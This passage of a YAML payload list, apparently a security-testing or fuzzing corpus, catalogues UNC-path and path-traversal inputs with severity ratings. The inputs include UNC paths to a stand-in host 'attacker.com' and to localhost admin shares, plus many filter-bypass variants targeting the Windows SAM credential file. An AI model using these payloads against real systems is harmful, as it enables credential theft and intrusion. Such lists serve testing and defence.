      severity: critical
      tags: [unc, localhost]

    - value: "\\\\127.0.0.1\\admin$"
      description: "UNC localhost admin$"
      severity: critical
      tags: [unc, localhost]

    - value: "\\\\127.0.0.1\\ipc$"
      description: "UNC localhost ipc$"
      severity: critical
      tags: [unc, localhost]

    - value: "\\\\attacker.com\\share"
      description: "UNC external server"
      severity: critical
      tags: [unc, external]

    - value: "\\\\attacker.com\\share\\file.txt"
      description: "UNC external file"
      severity: critical
      tags: [unc, external]

    - value: "\\\\10.0.0.1\\share"
      description: "UNC internal network"
      severity: critical
      tags: [unc, internal]

    - value: "\\\\192.168.1.1\\share"
      description: "UNC router"
      severity: critical
      tags: [unc, internal]

    - value: "\\\\\\\\.\\C:\\windows\\win.ini"
      description: "UNC device path"
      severity: high
      tags: [unc, device]

    - value: "\\\\?\\C:\\windows\\win.ini"
      description: "UNC long path prefix"
      severity: high
      tags: [unc, long_path]

    - value: "\\\\.\\C:\\windows\\win.ini"
      description: "UNC dot device path"
      severity: high
      tags: [unc, device]

    - value: "//server/share"
      description: "Forward slash UNC"
      severity: high
      tags: [unc, forward_slash]

    - value: "//attacker.com/share"
      description: "Forward slash UNC external"
      severity: critical
      tags: [unc, external]

  filter_bypass:
    - value: "..\\..\\..\\windows\\system32\\config\\sam"
      description: "Standard backslash"
      severity: critical
      tags: [filter_bypass]

    - value: "..\\..\\..\\windows/system32/config/sam"
      description: "Mixed slashes"
      severity: critical
      tags: [filter_bypass, mixed_slash]

    - value: "....\\\\....\\\\....\\\\windows\\\\system32\\\\config\\\\sam"
      description: "Double backslash bypass"
      severity: critical
      tags: [filter_bypass, double_backslash]

    - value: "..;/..;/..;/windows/system32/config/sam"
      description: "Semicolon bypass"
      severity: critical
      tags: [filter_bypass, semicolon]

    - value: "/../../../windows/system32/config/sam"
      description: "Leading slash forward"
      severity: critical
      tags: [filter_bypass, leading_slash]

    - value: "\\..\\..\\..\\windows\\system32\\config\\sam"
      description: "Leading backslash"
      severity: critical
      tags: [filter_bypass, leading_slash]

    - value: "..\\..\\..\\WINDOWS\\SYSTEM32\\CONFIG\\SAM"
      description: "Uppercase bypass"
      severity: critical
      tags: [filter_bypass, case]

    - value: "..\\..\\..\\WiNdOwS\\sYsTeM32\\cOnFiG\\sAm"
      description: "Mixed case bypass"
      severity: critical
      tags: [filter_bypass, case]

    - value: "..%00\\..%00\\..%00\\windows\\system32\\config\\sam"
      description: "Null byte in path"
      severity: critical
      tags: [filter_bypass, null_byte]

    - value: "..\\..\\..\\windows\\system32\\config\\sam#"
      description: "Fragment bypass"
      severity: high
      tags: [filter_bypass, fragment]

    - value: "..\\..\\..\\windows\\system32\\config\\sam?"
      description: "Query bypass"
      severity: high
      tags: [filter_bypass, query]

    - value: "..\\..\\..\\windows\\system32\\config\\sam%20"
      description: "Space bypass"
      severity: high
      tags: [filter_bypass, space]

    - value: "..\\..\\..\\windows\\system32\\config\\sam%09"
      description: "Tab bypass"
      severity: high
      tags: [filter_bypass, tab]

    - value: "..\\..\\..\\windows\\system32\\config\\sam%0d%0a"
      description: "CRLF bypass"
      severity: high
      tags: [filter_bypass, crlf]

